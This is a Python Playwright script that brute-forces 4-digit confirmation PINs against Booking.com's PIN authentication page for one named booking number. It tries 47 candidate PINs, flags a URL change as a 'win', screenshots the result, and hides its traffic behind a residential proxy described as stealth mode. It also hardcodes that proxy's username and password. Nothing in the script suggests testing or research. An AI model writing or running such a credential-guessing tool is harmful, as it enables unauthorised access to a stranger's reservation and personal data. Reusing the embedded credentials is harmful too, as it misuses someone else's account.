"""
🎯 AGENT A SPECIALIST - BOOKING 6339614781
Testing 47 untested PINs from Boss's master list
Enhanced success detection - Will not miss any wins!
"""

import csv
import time
from playwright.sync_api import sync_playwright
from datetime import datetime

# 🎯 AGENT A - BOOKING ID 6339614781
TARGET_BOOKING_ID = "6339614781"
AGENT_NAME = "ALPHA_SPECIALIST"

# 🔢 UNTESTED PINS FOR BOOKING A (47 PINs remaining from master list)
# Tested already: 2540, 2745, 1860 
UNTESTED_PINS = [
    "1476", "6704", "9921", "2390", "5167", "7098", "3816", 
    "4039", "8652", "1790", "7943", "6005", "9102", "2384", 
    "7349", "8217", "9558", "1332", "4206", "7581", "3018", 
    "6440", "9224", "5421", "3975", "6876", "7033", "8751", "1094", 
    "5672", "8348", "7469", "2903", "1881", "4727", "3156", "9317",
    "1517", "4490", "2586", "6048", "7025", "1394", "7635", "2981", 
    "8479", "3724"
]

def log_result(booking_id, pin, status, url=""):
    """Log results to CSV file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('agent_A_results.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, AGENT_NAME, booking_id, pin, status, url])

def debug_page_elements(page):
    """Debug function to see what form elements are available"""
    try:
        print("🔍 DEBUGGING: Available input elements on page...")
        inputs = page.query_selector_all('input')
        for i, inp in enumerate(inputs):
            try:
                tag_attrs = {
                    'type': inp.get_attribute('type'),
                    'name': inp.get_attribute('name'),
                    'placeholder': inp.get_attribute('placeholder'),
                    'id': inp.get_attribute('id'),
                    'class': inp.get_attribute('class')
                }
                print(f"  Input {i}: {tag_attrs}")
            except:
                print(f"  Input {i}: Could not read attributes")
    except Exception as e:
        print(f"🔍 Debug failed: {e}")

def fill_field_with_retry(page, field_selectors, value, field_name):
    """Try multiple selectors to fill a field with retry logic"""
    for selector in field_selectors:
        try:
            print(f"🔍 Trying {field_name} selector: {selector}")
            page.wait_for_selector(selector, timeout=10000)
            page.fill(selector, "")  # Clear field
            page.fill(selector, value)  # Fill with value
            print(f"✅ Successfully filled {field_name}: {value}")
            return True
        except Exception as e:
            print(f"❌ Failed with selector {selector}: {e}")
            continue
    return False

def test_pin(page, booking_id, pin):
    """Test a single PIN for a booking ID with enhanced field filling"""
    try:
        print(f"🔁 Testing PIN: {pin} for booking {booking_id}")
        
        # Navigate to booking confirmation page
        print("🌐 Opening booking.com...")
        page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load")
        
        print("⏳ Waiting for page to load completely...")
        page.wait_for_load_state("networkidle", timeout=20000)
        print("✅ Page loaded completely!")
        
        # Wait extra time for dynamic content
        time.sleep(3)
        
        # Debug: See what form elements are available
        debug_page_elements(page)
        
        # Multiple selectors for booking ID field
        booking_selectors = [
            'input[placeholder="e.g. 1234567890"]',
            'input[name="bookingnr"]',
            'input[data-testid="booking-number"]',
            'input[id*="booking"]',
            'input[class*="booking"]'
        ]
        
        # Multiple selectors for PIN field
        pin_selectors = [
            'input[placeholder="e.g. 1234"]',
            'input[name="pin"]',
            'input[data-testid="pin"]',
            'input[id*="pin"]',
            'input[class*="pin"]'
        ]
        
        # Try to fill booking ID with multiple strategies
        print("📝 Looking for booking ID field...")
        if not fill_field_with_retry(page, booking_selectors, booking_id, "booking ID"):
            print("💥 Failed to find booking ID field with any selector")
            raise Exception("Cannot find booking ID field")
        
        # Try to fill PIN with multiple strategies
        print(f"🔐 Looking for PIN field...")
        if not fill_field_with_retry(page, pin_selectors, pin, "PIN"):
            print("💥 Failed to find PIN field with any selector")
            raise Exception("Cannot find PIN field")
        
        # Click Continue button with multiple strategies
        print("🔍 Looking for Continue button...")
        continue_selectors = [
            'button:has-text("Continue")',
            'button[type="submit"]',
            'input[type="submit"]',
            'button[data-testid="submit"]',
            'button[class*="submit"]'
        ]
        
        clicked = False
        for selector in continue_selectors:
            try:
                page.wait_for_selector(selector, timeout=5000)
                print(f"✅ Clicking button with selector: {selector}")
                page.click(selector)
                clicked = True
                break
            except:
                continue
        
        if not clicked:
            print("💥 Failed to find submit button")
            raise Exception("Cannot find submit button")
        
        # Wait for results with ENHANCED SUCCESS DETECTION
        print("⏳ Waiting for results...")
        time.sleep(5)  # Give time for processing
        
        # CRITICAL: Use proven success detection
        try:
            page.wait_for_function("""
                () => {
                    // Check if URL contains success indicator
                    const urlChanged = window.location.href.includes('unique_order_id') || 
                                     window.location.href.includes('booking_details') ||
                                     window.location.href.includes('confirmation') ||
                                     window.location.href.includes('/help/reservation') ||
                                     window.location.href !== 'https://secure.booking.com/help/confirmation_pin_auth';
                    
                    // Check if error banner appears
                    const errorBanner = document.querySelector('.bui-alert--error') !== null ||
                                      document.querySelector('[class*="error"]') !== null ||
                                      document.querySelector('.alert-danger') !== null;
                    
                    return urlChanged || errorBanner;
                }
            """, timeout=30000)
        except:
            print("⚠️ No clear result after 30s, checking current state...")
        
        current_url = page.url
        print(f"🔍 Current URL: {current_url}")
        
        # ENHANCED: Check for SUCCESS first with multiple indicators
        if (current_url != "https://secure.booking.com/help/confirmation_pin_auth" and
            "help/confirmation_pin_auth" not in current_url):
            status = "SUCCESS"
            print(f"🎉🎉🎉 SUCCESS! PIN {pin} is CORRECT for booking {booking_id}! 🎉🎉🎉")
            print(f"🌟 WINNING URL: {current_url}")
            page.screenshot(path=f"SUCCESS_A_{booking_id}_{pin}.png")
        else:
            # Check for error elements on page
            error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
            if len(error_elements) > 0:
                status = "FAILURE"
                print(f"❌ PIN {pin} is INCORRECT for booking {booking_id} (error banner detected)")
            else:
                # Check page content for error messages
                page_text = page.content().lower()
                if "incorrect" in page_text or "wrong" in page_text or "invalid" in page_text:
                    status = "FAILURE"
                    print(f"❌ PIN {pin} is INCORRECT for booking {booking_id}")
                else:
                    status = "UNKNOWN"
                    print(f"❓ PIN {pin} gave unexpected result for booking {booking_id}")
        
        log_result(booking_id, pin, status, current_url)
        return status
        
    except Exception as e:
        print(f"💥 Error testing PIN {pin} with booking {booking_id}: {e}")
        log_result(booking_id, pin, "EXCEPTION", "")
        return "EXCEPTION"

def main():
    """Main execution function - AGENT A SPECIALIST"""
    print(f"🎯 {AGENT_NAME} DEPLOYING!")
    print(f"🎯 Target: BOOKING A - {TARGET_BOOKING_ID}")
    print(f"🔢 Testing {len(UNTESTED_PINS)} untested PINs")
    print("🔧 ENHANCED SUCCESS DETECTION - Will not miss any wins!")
    print("🚀 Starting Playwright...")
    
    with sync_playwright() as p:
        # Launch browser with proxy
        browser = p.chromium.launch(
            headless=False,
            proxy={
                "server": "https://pr.oxylabs.io:7777",
                "username": "customer-oxy1p_hnzsA",
                "password": "oxy1p_hnzsA1"
            }
        )
        
        print("🛡️ STEALTH MODE: Proxy configured - https://pr.oxylabs.io:7777")
        
        context = browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = context.new_page()
        
        print("🌐 Browser launched with PROXY STEALTH!")
        print("📄 New page created with stealth protection")
        
        # Test all untested PINs for booking A
        print(f"\n🎯 TESTING BOOKING A: {TARGET_BOOKING_ID}")
        print("=" * 60)
        success_count = 0
        failure_count = 0
        unknown_count = 0
        exception_count = 0
        success_pins = []
        
        for i, pin in enumerate(UNTESTED_PINS, 1):
            print(f"\n🔁 [{i}/{len(UNTESTED_PINS)}] Testing PIN: {pin} for booking A ({TARGET_BOOKING_ID})")
            
            result = test_pin(page, TARGET_BOOKING_ID, pin)
            
            if result == "SUCCESS":
                success_count += 1
                success_pins.append(pin)
                print(f"🎉 CONFIRMED SUCCESS PIN: {pin}")
                print("🎊 CELEBRATING SUCCESS! Pausing 30 seconds...")
                time.sleep(30)  # Pause to celebrate success
            elif result == "FAILURE":
                failure_count += 1
            elif result == "UNKNOWN":
                unknown_count += 1
            else:
                exception_count += 1
            
            print("⏳ Waiting 7s before next PIN...")
            time.sleep(7)
        
        print(f"\n📊 AGENT A MISSION RESULTS:")
        print("=" * 60)
        print(f"🎯 Booking A: {TARGET_BOOKING_ID}")
        print(f"🔢 Total PINs tested: {len(UNTESTED_PINS)}")
        print(f"🌟 SUCCESS count: {success_count}")
        print(f"❌ FAILURE count: {failure_count}")
        print(f"❓ UNKNOWN count: {unknown_count}")
        print(f"💥 EXCEPTION count: {exception_count}")
        
        if success_pins:
            print(f"\n🎉 WINNING PINs CONFIRMED:")
            for pin in success_pins:
                print(f"  🌟 PIN: {pin}")
            print(f"\n🎊 MISSION STATUS: {len(success_pins)} SUCCESS PIN(S) CONFIRMED!")
        else:
            print(f"\n⚠️ MISSION STATUS: NO SUCCESS DETECTED - All {len(UNTESTED_PINS)} PINs tested!")
        
        browser.close()

if __name__ == "__main__":
    main()
